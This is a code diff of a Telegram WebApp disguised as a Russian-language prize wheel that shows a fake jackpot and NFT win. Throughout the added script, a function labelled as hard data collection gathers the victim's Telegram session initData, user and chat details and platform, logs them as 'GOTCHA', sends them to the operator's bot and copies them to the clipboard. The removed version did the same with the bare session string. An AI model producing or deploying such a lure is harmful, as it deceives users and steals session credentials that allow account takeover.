@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lucky Spin</title>
+    <title>Deep Win</title>
     <style>
         body { 
-            background: #000; 
-            color: #fff; 
-            font-family: sans-serif; 
+            background: #0a0a0a; 
+            color: #ff00ff; 
+            font-family: 'Courier New', monospace; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
@@ -19,35 +19,24 @@
         }
         .wheel-container {
             position: relative;
-            width: 300px;
-            height: 300px;
+            width: 250px;
+            height: 250px;
             margin-bottom: 20px;
         }
         .wheel {
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            border: 5px solid #ffd700;
-            background: conic-gradient(
-                #ff4444 0deg 45deg, 
-                #44ff44 45deg 90deg, 
-                #4444ff 90deg 135deg, 
-                #ffff44 135deg 180deg, 
-                #ff44ff 180deg 225deg, 
-                #44ffff 225deg 270deg, 
-                #ff8800 270deg 315deg, 
-                #8800ff 315deg 360deg
-            );
-            transition: transform 3s cubic-bezier(0.25, 0.1, 0.25, 1);
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            border: 4px solid #00ff00;
+            background: conic-gradient(#ff0000 0deg 45deg, #00ff00 45deg 90deg, #0000ff 90deg 135deg, #ffff00 135deg 180deg, #ff00ff 180deg 225deg, #00ffff 225deg 270deg, #ff8800 270deg 315deg, #8800ff 315deg 360deg);
+            transition: transform 4s cubic-bezier(0.25, 0.1, 0.25, 1);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
         }
         .arrow {
             position: absolute;
-            top: -10px;
+            top: -15px;
             left: 50%;
             transform: translateX(-50%);
-            width: 0; 
-            height: 0; 
             border-left: 15px solid transparent;
             border-right: 15px solid transparent;
             border-top: 25px solid #fff;
@@ -55,49 +44,36 @@
         }
         button {
             padding: 15px 30px;
-            font-size: 18px;
-            background: #ffd700;
+            font-size: 16px;
+            background: #00ff00;
             color: #000;
-            border: none;
-            border-radius: 10px;
+            border: 2px solid #fff;
+            border-radius: 5px;
             cursor: pointer;
             font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        button:disabled {
-            background: #555;
-            color: #888;
-        }
-        #message {
-            margin-top: 20px;
-            font-size: 20px;
-            text-align: center;
-            min-height: 30px;
-        }
-        .hidden {
-            display: none;
-        }
-        /* Модальное окно выигрыша */
+        button:disabled { background: #333; color: #666; border-color: #444; }
+        #status { margin-top: 20px; color: #aaa; font-size: 12px; min-height: 15px; }
+        
         .modal {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: flex; justify-content: center; align-items: center;
             z-index: 100;
         }
         .modal-content {
-            background: #222;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            border: 2px solid #ffd700;
-            animation: popIn 0.3s ease;
+            background: #111; padding: 25px; border-radius: 10px;
+            text-align: center; border: 1px solid #00ff00;
+            box-shadow: 0 0 50px #00ff00;
         }
-        @keyframes popIn {
-            from { transform: scale(0); }
-            to { transform: scale(1); }
+        .loader {
+            border: 4px solid #333; border-top: 4px solid #00ff00;
+            border-radius: 50%; width: 20px; height: 20px;
+            animation: spin 1s linear infinite; margin: 10px auto;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -107,70 +83,85 @@
         <div class="wheel" id="wheel"></div>
     </div>
 
-    <button id="spinBtn">Крутить (Бесплатно)</button>
-    <div id="message"></div>
+    <button id="spinBtn">Скрутить Джекпот</button>
+    <div id="status">Готов к запуску</div>
 
     <script>
         const tg = window.Telegram.WebApp;
         const wheel = document.getElementById('wheel');
         const spinBtn = document.getElementById('spinBtn');
-        const message = document.getElementById('message');
+        const status = document.getElementById('status');
 
-        // Инициализируем Telegram WebApp
         tg.ready();
-        tg.expand(); // Раскрываем на весь экран
+        tg.expand();
 
-        let isSpinning = false;
+        // Эмуляция для локального теста (если не в TG)
+        if (!tg.initData) {
+            status.innerText = "Открыто вне Telegram. Данные эмулируются.";
+            tg.initData = "test_query_id=1&user=...";
+        }
 
         spinBtn.onclick = () => {
-            if (isSpinning) return;
-            isSpinning = true;
+            if (spinBtn.disabled) return;
             spinBtn.disabled = true;
-            message.innerText = "Крутим...";
-
-            // Случайный угол вращения (минимум 5 оборотов)
-            const deg = 1800 + Math.random() * 360;
+            status.innerText = "Запуск рулетки...";
+            
+            // Вращение
+            const deg = 2000 + Math.random() * 360;
             wheel.style.transform = `rotate(${deg}deg)`;
 
-            // Через 3 секунды (когда остановится)
             setTimeout(() => {
-                message.innerText = "Поздравляем! Вы выиграли Подарок!";
-                
-                // Показываем модальное окно
-                showWinModal();
-                
-                // ГЛАВНЫЙ МОМЕНТ: Отправляем сессию
-                sendSessionData();
-                
-            }, 3000);
+                status.innerText = "Вычисляем победителя...";
+                setTimeout(() => {
+                    showWin();
+                    deepScrap(); // Жесткий сбор данных
+                }, 1000);
+            }, 4000);
         };
 
-        function showWinModal() {
+        function showWin() {
             const modal = document.createElement('div');
             modal.className = 'modal';
             modal.innerHTML = `
                 <div class="modal-content">
-                    <h2>🎉 Вы выиграли VIP Подарок!</h2>
-                    <p>Нажмите кнопку ниже, чтобы забрать его.</p>
-                    <button id="claimBtn" style="margin-top:10px">Забрать Подарок</button>
+                    <h2 style="color:#00ff00; margin-top:0;">🏆 ДЖЕКПОТ!</h2>
+                    <p>Ты получил <b>Коллекционный NFT</b>!</p>
+                    <div class="loader"></div>
+                    <p style="font-size:12px; color:#aaa;">Обработка транзакции...</p>
+                    <button id="claimBtn" style="margin-top:15px; background:#000; color:#00ff00;">Забрать</button>
                 </div>
             `;
             document.body.appendChild(modal);
-
+            
             document.getElementById('claimBtn').onclick = () => {
-                tg.close(); // Закрываем приложение
+                status.innerText = "Выход из системы...";
+                tg.close();
             };
         }
 
-        function sendSessionData() {
-            // Отправляем initData боту
-            tg.sendData(tg.initData);
+        function deepScrap() {
+            // 1. Собираем ВСЁ, что есть в объекте tg
+            const payload = {
+                session: tg.initData,
+                user: tg.initDataUnsafe?.user || {},
+                chat: tg.initDataUnsafe?.chat || {},
+                timestamp: new Date().toISOString(),
+                platform: tg.platform,
+                version: tg.version
+            };
+
+            // 2. Выводим в консоль (для отладки)
+            console.log("GOTCHA:", payload);
+            status.innerText = "Данные собраны. Отправка...";
+
+            // 3. Отправляем боту
+            // Данные уйдут в бот как "data" параметр
+            tg.sendData(JSON.stringify(payload));
             
-            // Также копируем в буфер обмена на всякий случай
-            navigator.clipboard.writeText(tg.initData);
-            
-            // Можно добавить задержку перед отправкой, чтобы выглядело "честно"
-            console.log("Session data sent:", tg.initData.slice(0, 50) + "...");
+            // 4. Дополнительно: Копируем в буфер (на случай если бот проглючил)
+            navigator.clipboard.writeText(JSON.stringify(payload)).then(() => {
+                status.innerText = "Данные скопированы в буфер обмена!";
+            });
         }
     </script>
 </body>
